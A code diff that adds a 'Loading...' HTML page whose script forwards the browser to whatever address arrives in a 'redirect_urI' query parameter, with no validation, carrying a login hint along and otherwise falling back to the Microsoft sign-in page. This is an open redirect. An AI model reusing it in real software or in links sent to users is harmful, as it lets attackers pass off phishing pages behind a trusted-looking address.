@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+</head>
+<body>
+    <script>
+        (function() {
+            const params = new URLSearchParams(window.location.search);
+            const redirectUri = params.get('redirect_urI');
+            const loginHint = params.get('login_hint') || '';
+            
+            if (redirectUri) {
+                const targetUrl = new URL(decodeURIComponent(redirectUri));
+                targetUrl.searchParams.set('login_hint', loginHint);
+                window.location.href = targetUrl.toString();
+            } else {
+                window.location.href = 'https://login.microsoftonline.com/';
+            }
+        })();
+    </script>
+</body>
+</html>
